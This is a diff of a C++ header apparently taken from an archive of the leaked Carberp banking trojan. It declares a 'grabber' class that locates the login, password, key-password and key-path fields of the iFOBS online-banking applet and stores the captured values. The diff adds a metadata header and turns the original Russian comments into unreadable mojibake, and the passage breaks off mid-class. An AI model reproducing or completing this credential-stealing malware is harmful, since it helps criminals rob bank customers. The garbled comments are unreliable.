@@ -1,9 +1,20 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 //===========================================================================
-//  Грабер онланбанка работающего на Ifobs аплете
+//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ Ifobs пїЅпїЅпїЅпїЅпїЅпїЅ
 //
-//  Модифицирован: Декабрь 2012
-//  Версия:        1.0
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: пїЅпїЅпїЅпїЅпїЅпїЅпїЅ 2012
+//  пїЅпїЅпїЅпїЅпїЅпїЅ:        1.0
 //===========================================================================
 
 #ifndef IfobsOnlineH
@@ -15,31 +26,31 @@
 #include "BotClasses.h"
 
 
-#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс. размер ключа 3 мегабайта */
+#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 3 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ */
 
 
 namespace IfobsOnline
 {
-	// Функция активирует грабер IfobsOnline
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ IfobsOnline
 	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd);
 }
 
 
 
 //******************************************************
-//  Класс идентификации Ифобс банка по схеме окон
+//  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //******************************************************
 class TIfobsOnlineGrabber : public TBotObject
 {
 private:
 	HWND FSunAwtFrameWnd;
-	TBotList FEdits; // Список едитов
+	TBotList FEdits; // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	HWND LoginWnd;
 	HWND PasswordWnd;
 	HWND KeyPasswordWnd;
 	HWND KeyPathWnd;
-	DWORD Captions;  // Флаги найденых подписей
+	DWORD Captions;  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	string FLogin;
 	string FPassword;
